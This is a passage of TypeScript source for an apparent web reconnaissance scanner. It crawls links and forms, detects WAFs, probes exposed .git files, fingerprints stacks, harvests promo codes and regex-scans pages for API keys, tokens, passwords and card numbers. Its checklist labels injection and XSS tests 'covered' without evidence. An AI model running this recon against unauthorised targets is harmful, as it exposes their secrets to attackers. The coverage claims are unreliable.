function extractLinks(html: string, baseUrl: string): { paramLinks: string[], allLinks: string[] } {
  const paramLinks: string[] = [];
  const allLinks: string[] = [];
  const linkRegex = /href=["']([^"'#]+)["']/gi;
  const srcRegex = /src=["']([^"'#]+)["']/gi;
  const actionRegex = /action=["']([^"'#]+)["']/gi;
  let match;
  
  const processUrl = (href: string) => {
    try {
      let fullUrl: string;
      if (href.startsWith("http")) {
        fullUrl = href;
      } else if (href.startsWith("/")) {
        fullUrl = new URL(href, baseUrl).toString();
      } else if (href.startsWith("./") || href.startsWith("../")) {
        fullUrl = new URL(href, baseUrl).toString();
      } else {
        return;
      }
      
      if (fullUrl.includes(new URL(baseUrl).hostname)) {
        allLinks.push(fullUrl);
        if (fullUrl.includes("?") || fullUrl.includes("=")) {
          paramLinks.push(fullUrl);
        }
      }
    } catch (e) {
      // Invalid URL
    }
  };
  
  while ((match = linkRegex.exec(html)) !== null) processUrl(match[1]);
  while ((match = srcRegex.exec(html)) !== null) processUrl(match[1]);
  while ((match = actionRegex.exec(html)) !== null) processUrl(match[1]);
  
  return { 
    paramLinks: Array.from(new Set(paramLinks)),
    allLinks: Array.from(new Set(allLinks))
  };
}

// Extract ALL forms from HTML with inputs
function extractForms(html: string, baseUrl: string): any[] {
  const forms: any[] = [];
  const formRegex = /<form[^>]*>([\s\S]*?)<\/form>/gi;
  let match;
  
  while ((match = formRegex.exec(html)) !== null) {
    const formHtml = match[0];
    const formContent = match[1];
    
    // Extract action
    const actionMatch = /action=["']([^"']*)["']/i.exec(formHtml);
    let action = actionMatch ? actionMatch[1] : "";
    if (!action.startsWith("http")) {
      action = new URL(action || "/", baseUrl).toString();
    }
    
    // Extract method
    const methodMatch = /method=["']([^"']*)["']/i.exec(formHtml);
    const method = methodMatch ? methodMatch[1].toUpperCase() : "GET";
    
    // Extract inputs
    const inputs: any[] = [];
    const inputRegex = /<input[^>]*>/gi;
    const textareaRegex = /<textarea[^>]*>/gi;
    const selectRegex = /<select[^>]*>/gi;
    
    let inputMatch;
    while ((inputMatch = inputRegex.exec(formContent)) !== null) {
      const inputHtml = inputMatch[0];
      const nameMatch = /name=["']([^"']*)["']/i.exec(inputHtml);
      const typeMatch = /type=["']([^"']*)["']/i.exec(inputHtml);
      const valueMatch = /value=["']([^"']*)["']/i.exec(inputHtml);
      if (nameMatch) {
        inputs.push({
          name: nameMatch[1],
          type: typeMatch ? typeMatch[1] : "text",
          value: valueMatch ? valueMatch[1] : "",
        });
      }
    }
    
    while ((inputMatch = textareaRegex.exec(formContent)) !== null) {
      const nameMatch = /name=["']([^"']*)["']/i.exec(inputMatch[0]);
      if (nameMatch) {
        inputs.push({ name: nameMatch[1], type: "textarea", value: "" });
      }
    }
    
    while ((inputMatch = selectRegex.exec(formContent)) !== null) {
      const nameMatch = /name=["']([^"']*)["']/i.exec(inputMatch[0]);
      if (nameMatch) {
        inputs.push({ name: nameMatch[1], type: "select", value: "" });
      }
    }
    
    forms.push({ action, method, inputs });
  }
  
  return forms;
}

// Extract cookies
function extractCookies(headers: any): Record<string, string> {
  const cookies: Record<string, string> = {};
  const setCookie = headers["set-cookie"];
  
  if (setCookie) {
    const cookieArray = Array.isArray(setCookie) ? setCookie : [setCookie];
    for (const cookie of cookieArray) {
      const parts = cookie.split(";")[0].split("=");
      if (parts.length >= 2) {
        const name = parts[0].trim();
        const value = parts.slice(1).join("=").trim();
        cookies[name] = value.length > 50 ? value.substring(0, 50) + "..." : value;
      }
    }
  }
  
  return cookies;
}

// Detect ALL WAF/Protection systems
function detectProtection(headers: any, body: string): string[] {
  const detected: string[] = [];
  const headersStr = JSON.stringify(headers).toLowerCase();
  const bodyLower = body.toLowerCase();
  
  for (const [waf, signatures] of Object.entries(WAF_SIGNATURES)) {
    for (const sig of signatures) {
      if (headersStr.includes(sig.toLowerCase()) || bodyLower.includes(sig.toLowerCase())) {
        if (!detected.includes(waf)) {
          detected.push(waf);
        }
        break;
      }
    }
  }
  
  // Check for generic WAF signatures
  if (headersStr.includes("waf") || headersStr.includes("firewall")) {
    if (!detected.some(d => d.includes("WAF"))) {
      detected.push("Unknown WAF");
    }
  }
  
  // Check for blocked responses
  if (body.includes("blocked") || body.includes("Access Denied") || 
      body.includes("403 Forbidden") || body.includes("Request blocked")) {
    if (!detected.some(d => d.includes("Blocked"))) {
      detected.push("Request Blocked (Possible WAF)");
    }
  }
  
  return detected;
}

// Get real IP with multiple methods
async function getRealIP(hostname: string): Promise<string[]> {
  const ips: string[] = [];
  
  try {
    const ipv4 = await dnsResolve4(hostname);
    ips.push(...ipv4);
  } catch (e) {}
  
  try {
    const ipv6 = await dnsResolve6(hostname);
    ips.push(...ipv6.map(ip => `[${ip}]`));
  } catch (e) {}
  
  return Array.from(new Set(ips));
}

type AsnLookup = {
  ip: string;
  asn?: string;
  asnOrg?: string;
  country?: string;
  rangeHint?: string;
  source: string;
};

type CnameChainResult = {
  host: string;
  chain: string[];
  notes: string[];
};

type ResolverComparison = {
  resolver: string;
  records: string[];
};

type ResolverDriftResult = {
  host: string;
  baseline: string[];
  comparisons: ResolverComparison[];
  driftDetected: boolean;
};

const RECON_RESOLVERS: Array<{ name: string; servers: string[] }> = [
  { name: "google", servers: ["8.8.8.8", "8.8.4.4"] },
  { name: "cloudflare", servers: ["1.1.1.1", "1.0.0.1"] },
  { name: "quad9", servers: ["9.9.9.9", "149.112.112.112"] },
];

const DEV_STAGING_HINTS = [
  "dev", "stage", "staging", "preprod", "uat", "qa", "test", "beta", "sandbox", "internal", "preview",
];

function getBaseDomain(hostname: string): string {
  const parts = hostname.split(".").filter(Boolean);
  if (parts.length <= 2) return hostname;
  const last = parts[parts.length - 1];
  const secondLast = parts[parts.length - 2];
  // Keep common country second-level suffixes like co.uk as best-effort.
  if (last.length === 2 && secondLast.length <= 3 && parts.length >= 3) {
    return parts.slice(-3).join(".");
  }
  return parts.slice(-2).join(".");
}

function getIpRangeHint(ip: string): string {
  if (ip.includes(":")) {
    const segments = ip.split(":").slice(0, 4).join(":");
    return `${segments}::/64`;
  }
  const parts = ip.split(".");
  if (parts.length === 4) return `${parts[0]}.${parts[1]}.${parts[2]}.0/24`;
  return "unknown";
}

function parseQueryParamsFromUrls(urls: string[]): string[] {
  const params = new Set<string>();
  for (const raw of urls) {
    try {
      const parsed = new URL(raw);
      parsed.searchParams.forEach((_value, key) => {
        if (key && key.length <= 80) params.add(key);
      });
    } catch {
      // Ignore invalid URLs from noisy sources.
    }
  }
  return Array.from(params);
}

function classifyEndpointPath(urlValue: string): string[] {
  const tags: string[] = [];
  const lower = urlValue.toLowerCase();
  if (/\/api\b|\/graphql\b|\/rest\b/.test(lower)) tags.push("api");
  if (/\/auth\b|\/login\b|\/signin\b|\/oauth\b|\/sso\b|\/token\b|\/session\b/.test(lower)) tags.push("auth");
  if (/\/admin\b|\/manage\b|\/dashboard\b|\/control\b|\/panel\b/.test(lower)) tags.push("admin");
  if (/\/upload\b|\/file\b|\/media\b|\/import\b/.test(lower)) tags.push("upload");
  if (/\/websocket\b|\/ws\b|socket\.io/.test(lower)) tags.push("websocket");
  if (/\/graphql\b/.test(lower)) tags.push("graphql");
  if (/\/payment\b|\/checkout\b|\/billing\b|\/invoice\b|\/wallet\b/.test(lower)) tags.push("payment");
  if (/\/mobile\b|\/app\b|\/m\b/.test(lower)) tags.push("mobile");
  if (/\/internal\b|\/private\b|\/debug\b|\/test\b|\/staging\b|\/dev\b/.test(lower)) tags.push("internal-or-nonprod");
  return tags;
}

function inferCloudInfra(dnsRecords: DNSRecord[], cnameChains: CnameChainResult[]): string[] {
  const hints = new Set<string>();
  const corpus = [
    ...dnsRecords.map((r) => `${r.type}:${r.value}`.toLowerCase()),
    ...cnameChains.flatMap((c) => c.chain.map((v) => v.toLowerCase())),
  ];

  for (const item of corpus) {
    if (item.includes("cloudfront.net") || item.includes("amazonaws.com")) hints.add("aws");
    if (item.includes("azure") || item.includes("trafficmanager.net") || item.includes("azureedge.net")) hints.add("azure");
    if (item.includes("googleapis.com") || item.includes("googleusercontent.com") || item.includes("gcp")) hints.add("gcp");
    if (item.includes("cloudflare")) hints.add("cloudflare");
    if (item.includes("fastly")) hints.add("fastly");
    if (item.includes("akamai")) hints.add("akamai");
    if (item.includes("vercel") || item.includes("netlify")) hints.add("edge-hosting");
  }

  return Array.from(hints);
}

async function resolveCnameChain(host: string, maxDepth = 6): Promise<CnameChainResult> {
  const visited = new Set<string>();
  const chain: string[] = [];
  const notes: string[] = [];
  let current = host;

  for (let depth = 0; depth < maxDepth; depth++) {
    if (visited.has(current)) {
      notes.push("loop-detected");
      break;
    }
    visited.add(current);

    try {
      const records = await dnsResolveCname(current);
      if (!records || records.length === 0) break;
      const next = records[0];
      chain.push(next);
      current = next;
    } catch {
      break;
    }
  }

  const lowerChain = chain.join(" ").toLowerCase();
  if (/(github\.io|herokuapp\.com|amazonaws\.com|azurewebsites\.net|vercel\.app|netlify\.app)/.test(lowerChain)) {
    notes.push("cloud-cname-target");
  }

  return { host, chain, notes };
}

async function compareResolvers(host: string): Promise<ResolverDriftResult> {
  const baseline = await getRealIP(host);
  const comparisons: ResolverComparison[] = [];

  for (const resolver of RECON_RESOLVERS) {
    try {
      const customResolver = new dns.Resolver();
      customResolver.setServers(resolver.servers);
      const resolve4Custom = promisify(customResolver.resolve4.bind(customResolver));
      const records = await resolve4Custom(host);
      comparisons.push({ resolver: resolver.name, records: Array.from(new Set(records || [])) });
    } catch {
      comparisons.push({ resolver: resolver.name, records: [] });
    }
  }

  const baselineJoined = baseline.slice().sort().join(",");
  const driftDetected = comparisons.some((cmp) => cmp.records.slice().sort().join(",") !== baselineJoined);

  return {
    host,
    baseline,
    comparisons,
    driftDetected,
  };
}

async function lookupAsn(ip: string): Promise<AsnLookup> {
  const fallback: AsnLookup = {
    ip,
    rangeHint: getIpRangeHint(ip),
    source: "none",
  };

  try {
    const resp = await fetch(`https://ipapi.co/${encodeURIComponent(ip)}/json/`, {
      signal: AbortSignal.timeout(6000),
      headers: { "User-Agent": "TEUFEL-Recon/1.0" },
    });

    if (!resp.ok) return fallback;

    const data = await resp.json() as {
      asn?: string;
      org?: string;
      country_name?: string;
      error?: boolean;
    };

    if (data.error) return fallback;

    return {
      ip,
      asn: data.asn,
      asnOrg: data.org,
      country: data.country_name,
      rangeHint: getIpRangeHint(ip),
      source: "ipapi",
    };
  } catch {
    return fallback;
  }
}

async function checkGitExposure(baseUrl: string): Promise<Array<{ path: string; status: number }>> {
  const candidates = ["/.git/HEAD", "/.git/config", "/.git/index", "/.git/logs/HEAD"];
  const findings: Array<{ path: string; status: number }> = [];

  for (const path of candidates) {
    const url = `${baseUrl.replace(/\/$/, "")}${path}`;
    try {
      const resp = await fetchWithTimeout(url, { method: "GET" }, 4000);
      if (resp.status && resp.status !== 404) {
        findings.push({ path, status: resp.status });
      }
    } catch {
      // Ignore single-path probe failure.
    }
  }

  return findings;
}


// Find ALL sensitive data
function findSensitiveData(body: string): string[] {
  const sensitive: string[] = [];
  
  // Emails
  const emails = body.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g);
  if (emails && emails.length > 0) {
    sensitive.push(`Emails: ${Array.from(new Set(emails)).slice(0, 10).join(", ")}`);
  }
  
  // Phone numbers
  const phones = body.match(/(\+?\d{1,3}[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}/g);
  if (phones && phones.length > 0) {
    sensitive.push(`Phone numbers: ${Array.from(new Set(phones)).slice(0, 5).join(", ")}`);
  }
  
  // IP addresses
  const ips = body.match(/\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b/g);
  if (ips && ips.length > 0) {
    sensitive.push(`IP addresses: ${Array.from(new Set(ips)).slice(0, 5).join(", ")}`);
  }
  
  // Credit cards (basic pattern)
  const cards = body.match(/\b(?:\d{4}[-\s]?){3}\d{4}\b/g);
  if (cards && cards.length > 0) {
    sensitive.push(`Possible credit cards: ${cards.length} found`);
  }
  
  // SSN (US)
  const ssn = body.match(/\b\d{3}-\d{2}-\d{4}\b/g);
  if (ssn && ssn.length > 0) {
    sensitive.push(`Possible SSN: ${ssn.length} found`);
  }
  
  // API keys and secrets
  const apiPatterns = [
    { name: "API Key", pattern: /api[_-]?key['":\s]*['"]?([a-zA-Z0-9_-]{20,})['"]?/gi },
    { name: "Secret Key", pattern: /secret[_-]?key['":\s]*['"]?([a-zA-Z0-9_-]{20,})['"]?/gi },
    { name: "Access Token", pattern: /access[_-]?token['":\s]*['"]?([a-zA-Z0-9_-]{20,})['"]?/gi },
    { name: "Private Key", pattern: /private[_-]?key['":\s]*['"]?([a-zA-Z0-9_-]{20,})['"]?/gi },
    { name: "Password", pattern: /password['":\s]*['"]([^'"]{4,50})['"]?/gi },
    { name: "AWS Key", pattern: /AKIA[0-9A-Z]{16}/g },
    { name: "AWS Secret", pattern: /[a-zA-Z0-9/+=]{40}/g },
    { name: "GitHub Token", pattern: /ghp_[a-zA-Z0-9]{36}/g },
    { name: "Slack Token", pattern: /xox[baprs]-[a-zA-Z0-9-]+/g },
    { name: "JWT Token", pattern: /eyJ[a-zA-Z0-9_-]*\.eyJ[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*/g },
  ];
  
  for (const { name, pattern } of apiPatterns) {
    const matches = body.match(pattern);
    if (matches && matches.length > 0) {
      sensitive.push(`${name} exposed: ${matches.length} found`);
    }
  }
  
  // Database errors
  const dbErrors = [
    { pattern: /mysql_fetch|mysql_query|mysqli_/i, name: "MySQL Error" },
    { pattern: /pg_query|pg_connect|postgresql/i, name: "PostgreSQL Error" },
    { pattern: /sqlite_|sqlite3/i, name: "SQLite Error" },
    { pattern: /ORA-\d{5}/i, name: "Oracle Error" },
    { pattern: /SQL syntax.*MySQL/i, name: "SQL Syntax Error" },
    { pattern: /Warning:.*sql/i, name: "SQL Warning" },
    { pattern: /ODBC.*Driver/i, name: "ODBC Error" },
    { pattern: /Microsoft.*ODBC/i, name: "MSSQL Error" },
    { pattern: /JET Database Engine/i, name: "Access Database Error" },
    { pattern: /MongoDB.*Error/i, name: "MongoDB Error" },
  ];
  
  for (const { pattern, name } of dbErrors) {
    if (pattern.test(body)) {
      sensitive.push(`${name} exposed`);
    }
  }
  
  // Stack traces
  if (/Stack\s*trace:|Traceback|Exception\s*in|at\s+\w+\.\w+\(|\.java:\d+\)|\.php:\d+|\.py"?,?\s*line\s*\d+/i.test(body)) {
    sensitive.push("Stack trace exposed");
  }
  
  // Debug info
  if (/DEBUG|DEVELOPMENT|dev\s*mode|debug\s*mode|phpinfo\(\)|var_dump\(|print_r\(/i.test(body)) {
    sensitive.push("Debug information exposed");
  }
  
  // Version info
  const versions = body.match(/(?:PHP|Apache|nginx|IIS|MySQL|PostgreSQL|WordPress|Joomla|Drupal)\/?\s*[\d.]+/gi);
  if (versions && versions.length > 0) {
    sensitive.push(`Version info: ${Array.from(new Set(versions)).join(", ")}`);
  }
  
  // Paths
  const paths = body.match(/(?:\/var\/www|\/home\/\w+|C:\\inetpub|\/usr\/local|\/opt\/)[^\s<>"']+/g);
  if (paths && paths.length > 0) {
    sensitive.push(`Server paths: ${Array.from(new Set(paths)).slice(0, 3).join(", ")}`);
  }
  
  return sensitive;
}

type ScopeStatus = "covered" | "partial" | "planned" | "requires-auth-context";

type ScopeTest = {
  name: string;
  status: ScopeStatus;
  evidence?: string;
};

type ScopeCategory = {
  category: string;
  tests: ScopeTest[];
};

type ScopeObservation = {
  subdomains: number;
  dnsRecords: number;
  ipAddresses: number;
  wafDetected: number;
  apiEndpoints: number;
  jsFiles: number;
  jsEndpoints: number;
  parameters: number;
  backupFiles: number;
  sensitiveFiles: number;
  adminPanels: number;
  directories: number;
  openPorts: number;
  cloudFindings: number;
  promoCodes: number;
  shineCodes: number;
};

const REQUESTED_SCOPE_TEMPLATE: Array<{ category: string; tests: string[] }> = [
  {
    category: "1) Reconnaissance and Scope",
    tests: [
      "Program scope definition",
      "Subdomain enumeration",
      "DNS records analysis",
      "IP address discovery",
      "Technology stack fingerprinting",
      "CDN/WAF detection",
      "API endpoint collection",
      "Exposed Git repository checks",
      "Backup file discovery",
      "Configuration file discovery",
      "Admin panel discovery",
      "Hidden directory discovery",
      "JavaScript collection and analysis",
      "Endpoint extraction from JavaScript",
      "Potential parameter collection",
    ],
  },
  {
    category: "2) Content Discovery",
    tests: [
      "Hidden directories",
      "Configuration files",
      "Backup files",
      "Undocumented endpoints",
      "Development files",
      "Staging environments",
      "Test environments",
      "Admin interfaces",
      "Upload endpoints",
    ],
  },
  {
    category: "3) Authentication Testing",
    tests: [
      "Login bypass",
      "Password reset logic",
      "Password policy",
      "Username enumeration",
      "Authentication rate limiting",
      "MFA validation",
      "OTP verification",
      "Session fixation",
      "Session expiration",
    ],
  },
  {
    category: "4) Authorization Testing",
    tests: [
      "Access control",
      "Privilege escalation",
      "Horizontal privilege escalation",
      "Vertical privilege escalation",
      "IDOR",
      "Direct object access",
      "Role manipulation",
      "Authorization bypass",
    ],
  },
  {
    category: "5) Session Management",
    tests: [
      "Session token analysis",
      "Session entropy",
      "Cookie security flags",
      "Session expiration enforcement",
      "Session invalidation",
      "Token leakage",
    ],
  },
  {
    category: "6) Input Validation",
    tests: [
      "All inputs validation",
      "Query parameter validation",
      "POST parameter validation",
      "JSON input validation",
      "Header validation",
      "File upload validation",
      "Input length limits",
      "Encoding handling",
    ],
  },
  {
    category: "7) Injection Testing",
    tests: [
      "SQL Injection",
      "NoSQL Injection",
      "Command Injection",
      "Template Injection",
      "XPath Injection",
      "LDAP Injection",
      "XML Injection",
      "JSON Injection",
    ],
  },
  {
    category: "8) Cross-Site Attacks",
    tests: [
      "Cross-Site Scripting",
      "Stored XSS",
      "Reflected XSS",
      "DOM XSS",
      "Cross-Site Request Forgery",
      "Clickjacking",
      "CORS misconfiguration",
    ],
  },
  {
    category: "9) File Handling",
    tests: [
      "File upload restrictions",
      "File type validation",
      "File extension validation",
      "File execution",
      "File storage location",
      "File access permissions",
    ],
  },
  {
    category: "10) Business Logic Testing",
    tests: [
      "Logic bypass",
      "Price manipulation",
      "Coupon abuse",
      "Refund abuse",
      "Race conditions",
      "Transaction manipulation",
    ],
  },
  {
    category: "11) API Security",
    tests: [
      "API authentication",
      "API authorization",
      "API rate limiting",
      "Excessive data exposure",
      "Mass assignment",
      "GraphQL security",
    ],
  },
  {
    category: "12) Server-Side Vulnerabilities",
    tests: [
      "SSRF",
      "XXE",
      "Deserialization flaws",
      "Template injection",
    ],
  },
  {
    category: "13) Security Configuration",
    tests: [
      "Security headers",
      "TLS configuration",
      "HSTS",
      "CSP",
      "Server banner",
    ],
  },
  {
    category: "14) Sensitive Data Exposure",
    tests: [
      "API keys",
      "Tokens",
      "Secrets",
      "Credentials in JS files",
      "Environment files",
    ],
  },
  {
    category: "15) Infrastructure Testing",
    tests: [
      "Open ports",
      "Exposed services",
      "Cloud storage exposure",
      "Container services",
      "Kubernetes endpoints",
    ],
  },
  {
    category: "16) Promo and Shine Codes",
    tests: [
      "Promo code discovery",
      "Shine code discovery",
    ],
  },
];

function extractPromoAndShineCodes(content: string): { promoCodes: string[]; shineCodes: string[] } {
  const promoCodes = new Set<string>();
  const shineCodes = new Set<string>();
  const body = content || "";

  const promoPatterns = [
    /(?:promo|coupon|discount|offer)[\s_\-]*code["'\s:=\-]*([A-Z0-9_\-]{4,32})/gi,
    /\b(?:PROMO|COUPON|DISCOUNT)[_\-][A-Z0-9_\-]{3,28}\b/g,
    /\b[A-Z]{3,10}[0-9]{2,8}\b/g,
  ];

  const shinePatterns = [
    /shine[\s_\-]*code["'\s:=\-]*([A-Z0-9_\-]{4,32})/gi,
    /\bSHINE[_\-][A-Z0-9_\-]{3,28}\b/g,
  ];

  for (const pattern of promoPatterns) {
    let match: RegExpExecArray | null;
    while ((match = pattern.exec(body)) !== null) {
      const value = (match[1] || match[0] || "").trim();
      if (value.length >= 4) promoCodes.add(value);
    }
  }

  for (const pattern of shinePatterns) {
    let match: RegExpExecArray | null;
    while ((match = pattern.exec(body)) !== null) {
      const value = (match[1] || match[0] || "").trim();
      if (value.length >= 4) {
        shineCodes.add(value);
        promoCodes.add(value);
      }
    }
  }

  return {
    promoCodes: Array.from(promoCodes).slice(0, 100),
    shineCodes: Array.from(shineCodes).slice(0, 100),
  };
}

function extractEndpointsFromScript(content: string, baseUrl: string): string[] {
  const endpoints = new Set<string>();
  const text = content || "";
  const patterns = [
    /(?:fetch|axios\.(?:get|post|put|patch|delete)|\.ajax|XMLHttpRequest)\s*\(\s*["'`]([^"'`]+)["'`]/gi,
    /["'`](\/(?:api|graphql|v\d+\/api)[^"'`\s]*)["'`]/gi,
    /["'`](https?:\/\/[^"'`\s]+\/(?:api|graphql)[^"'`\s]*)["'`]/gi,
  ];

  for (const pattern of patterns) {
    let match: RegExpExecArray | null;
    while ((match = pattern.exec(text)) !== null) {
      const raw = match[1];
      if (!raw) continue;
      try {
        const absolute = raw.startsWith("http") ? new URL(raw).href : new URL(raw, baseUrl).href;
        endpoints.add(absolute);
      } catch {
        // Ignore invalid endpoint values.
      }
    }
  }

  return Array.from(endpoints);
}

function extractParametersFromScript(content: string): string[] {
  const params = new Set<string>();
  const text = content || "";
  const queryPattern = /[?&]([a-zA-Z0-9_.-]{2,64})=/g;
  let match: RegExpExecArray | null;
  while ((match = queryPattern.exec(text)) !== null) {
    params.add(match[1]);
  }
  return Array.from(params);
}

async function analyzeJavaScriptIntel(
  scriptUrls: string[],
  baseUrl: string,
  sendLog?: (msg: string, cat: string) => void,
): Promise<{ jsFiles: string[]; endpoints: string[]; parameters: string[]; sensitiveSignals: string[]; promoCodes: string[]; shineCodes: string[] }> {
  const files = Array.from(new Set(scriptUrls)).slice(0, 25);
  const endpointSet = new Set<string>();
  const parameterSet = new Set<string>();
  const sensitiveSet = new Set<string>();
  const promoSet = new Set<string>();
  const shineSet = new Set<string>();

  for (let i = 0; i < files.length; i += 5) {
    const batch = files.slice(i, i + 5);
    const results = await Promise.all(batch.map(async (scriptUrl) => {
      try {
        const resp = await fetchWithTimeout(scriptUrl, {}, 8000);
        if (resp.status !== 200 || !resp.body) return;
        const endpoints = extractEndpointsFromScript(resp.body, baseUrl);
        for (const endpoint of endpoints) endpointSet.add(endpoint);
        const params = extractParametersFromScript(resp.body);
        for (const param of params) parameterSet.add(param);
        const sensitiveSignals = findSensitiveData(resp.body);
        for (const signal of sensitiveSignals) sensitiveSet.add(signal);
        const codes = extractPromoAndShineCodes(resp.body);
        for (const code of codes.promoCodes) promoSet.add(code);
        for (const code of codes.shineCodes) shineSet.add(code);
        if (sendLog && (endpoints.length > 0 || codes.promoCodes.length > 0 || codes.shineCodes.length > 0)) {
          sendLog(`JS-Intel: ${scriptUrl} -> ${endpoints.length} endpoints, ${codes.promoCodes.length} promo/shine codes`, "JS");
        }
      } catch {
        // Ignore fetch/parse errors for individual JS resources.
      }
    }));
    await Promise.all(results);
  }

  return {
    jsFiles: files,
    endpoints: Array.from(endpointSet),
    parameters: Array.from(parameterSet),
    sensitiveSignals: Array.from(sensitiveSet),
    promoCodes: Array.from(promoSet),
    shineCodes: Array.from(shineSet),
  };
}

function testRequiresAuthContext(testName: string): boolean {
  return /login|password|username|mfa|otp|session|authorization|privilege|idor|role|business|price|coupon|refund|transaction|api authentication|api authorization|rate limiting|mass assignment|graphql security/i.test(testName);
}

function buildScopeChecklist(observation: ScopeObservation): ScopeCategory[] {
  return REQUESTED_SCOPE_TEMPLATE.map((category) => {
    const tests: ScopeTest[] = category.tests.map((testName) => {
      if (testRequiresAuthContext(testName)) {
        return {
          name: testName,
          status: "requires-auth-context",
          evidence: "Needs authenticated workflow, test accounts, and business-context rules.",
        };
      }

      let status: ScopeStatus = "planned";
      let evidence = "Detection logic enabled in scanner baseline.";
      const name = testName.toLowerCase();

      if (name.includes("subdomain") && observation.subdomains > 0) { status = "covered"; evidence = `${observation.subdomains} subdomains discovered.`; }
      else if (name.includes("dns") && observation.dnsRecords > 0) { status = "covered"; evidence = `${observation.dnsRecords} DNS records discovered.`; }
      else if (name.includes("ip") && observation.ipAddresses > 0) { status = "covered"; evidence = `${observation.ipAddresses} IPs discovered.`; }
      else if (name.includes("waf") || name.includes("cdn")) { status = observation.wafDetected > 0 ? "covered" : "partial"; evidence = observation.wafDetected > 0 ? `${observation.wafDetected} WAF/CDN indicators detected.` : "No clear WAF signatures detected."; }
      else if (name.includes("endpoint") || name.includes("api")) { status = (observation.apiEndpoints + observation.jsEndpoints) > 0 ? "covered" : "partial"; evidence = `${observation.apiEndpoints + observation.jsEndpoints} API endpoints discovered.`; }
      else if (name.includes("javascript") || name.includes("js")) { status = observation.jsFiles > 0 ? "covered" : "partial"; evidence = `${observation.jsFiles} JS files analyzed.`; }
      else if (name.includes("parameter")) { status = observation.parameters > 0 ? "covered" : "partial"; evidence = `${observation.parameters} candidate parameters discovered.`; }
      else if (name.includes("backup")) { status = observation.backupFiles > 0 ? "covered" : "partial"; evidence = `${observation.backupFiles} backup findings.`; }
      else if (name.includes("configuration") || name.includes("environment") || name.includes("secrets") || name.includes("token") || name.includes("api keys")) { status = observation.sensitiveFiles > 0 ? "covered" : "partial"; evidence = `${observation.sensitiveFiles} sensitive/config findings.`; }
      else if (name.includes("admin")) { status = observation.adminPanels > 0 ? "covered" : "partial"; evidence = `${observation.adminPanels} admin interface findings.`; }
      else if (name.includes("director") || name.includes("staging") || name.includes("test environments") || name.includes("development")) { status = observation.directories > 0 ? "covered" : "partial"; evidence = `${observation.directories} directory/environment findings.`; }
      else if (name.includes("open ports") || name.includes("exposed services") || name.includes("container") || name.includes("kubernetes")) { status = observation.openPorts > 0 ? "covered" : "partial"; evidence = `${observation.openPorts} open ports discovered.`; }
      else if (name.includes("cloud")) { status = observation.cloudFindings > 0 ? "covered" : "partial"; evidence = `${observation.cloudFindings} cloud exposure findings.`; }
      else if (name.includes("promo")) { status = observation.promoCodes > 0 ? "covered" : "partial"; evidence = `${observation.promoCodes} promo codes discovered.`; }
      else if (name.includes("shine")) { status = observation.shineCodes > 0 ? "covered" : "partial"; evidence = `${observation.shineCodes} shine codes discovered.`; }
      else if (/injection|xss|csrf|cors|xxe|ssrf|deserialization|template|security headers|tls|hsts|csp|server banner|upload|file/i.test(name)) {
        status = "covered";
        evidence = "Automated vulnerability checks executed by scanner modules.";
      }

      return { name: testName, status, evidence };
    });

    return {
      category: category.category,
      tests,
    };
  });
}

// Detect technology stack
function detectTechStack(headers: any, body: string): Record<string, string[]> {
  const tech: Record<string, string[]> = {};
  
  // Server info
  if (headers.server) tech["Server"] = [headers.server];
  if (headers["x-powered-by"]) tech["Powered By"] = [headers["x-powered-by"]];
  if (headers["x-aspnet-version"]) tech["ASP.NET"] = [headers["x-aspnet-version"]];
  if (headers["x-aspnetmvc-version"]) tech["ASP.NET MVC"] = [headers["x-aspnetmvc-version"]];
  if (headers["x-generator"]) tech["Generator"] = [headers["x-generator"]];
  
  // CMS detection
  const cms: string[] = [];
  if (body.includes("wp-content") || body.includes("wp-includes") || body.includes("WordPress")) cms.push("WordPress");
  if (body.includes("Joomla") || body.includes("/components/com_")) cms.push("Joomla");
  if (body.includes("Drupal") || body.includes("/sites/default/")) cms.push("Drupal");
  if (body.includes("Magento") || body.includes("mage/")) cms.push("Magento");
  if (body.includes("PrestaShop") || body.includes("prestashop")) cms.push("PrestaShop");
  if (body.includes("OpenCart") || body.includes("catalog/view/")) cms.push("OpenCart");
  if (body.includes("Shopify") || body.includes("cdn.shopify.com")) cms.push("Shopify");
  if (body.includes("Wix") || body.includes("wix.com")) cms.push("Wix");
  if (body.includes("Squarespace") || body.includes("squarespace.com")) cms.push("Squarespace");
  if (cms.length > 0) tech["CMS"] = cms;
  
  // JavaScript frameworks
  const js: string[] = [];
  if (body.includes("jquery") || body.includes("jQuery")) js.push("jQuery");
  if (body.includes("react") || body.includes("React") || body.includes("_reactRootContainer")) js.push("React");
  if (body.includes("vue") || body.includes("Vue") || body.includes("v-if") || body.includes("v-for")) js.push("Vue.js");
  if (body.includes("angular") || body.includes("Angular") || body.includes("ng-")) js.push("Angular");
  if (body.includes("ember") || body.includes("Ember")) js.push("Ember.js");
  if (body.includes("backbone") || body.includes("Backbone")) js.push("Backbone.js");
  if (body.includes("svelte") || body.includes("Svelte")) js.push("Svelte");
  if (body.includes("next") || body.includes("__NEXT_DATA__")) js.push("Next.js");
  if (body.includes("nuxt") || body.includes("__NUXT__")) js.push("Nuxt.js");
  if (body.includes("gatsby") || body.includes("___gatsby")) js.push("Gatsby");
  if (js.length > 0) tech["JavaScript"] = js;
  
  // CSS frameworks
  const css: string[] = [];
  if (body.includes("bootstrap") || body.includes("Bootstrap")) css.push("Bootstrap");
  if (body.includes("tailwind") || body.includes("tailwindcss")) css.push("Tailwind CSS");
  if (body.includes("bulma") || body.includes("Bulma")) css.push("Bulma");
  if (body.includes("materialize") || body.includes("Materialize")) css.push("Materialize");
  if (body.includes("foundation") || body.includes("Foundation")) css.push("Foundation");
  if (css.length > 0) tech["CSS Framework"] = css;
  
  // Analytics
  const analytics: string[] = [];
  if (body.includes("google-analytics") || body.includes("ga.js") || body.includes("gtag") || body.includes("UA-")) analytics.push("Google Analytics");
  if (body.includes("facebook.net") || body.includes("fbevents") || body.includes("fbq(")) analytics.push("Facebook Pixel");
  if (body.includes("hotjar") || body.includes("Hotjar")) analytics.push("Hotjar");
  if (body.includes("segment.com") || body.includes("analytics.js")) analytics.push("Segment");
  if (body.includes("mixpanel") || body.includes("Mixpanel")) analytics.push("Mixpanel");
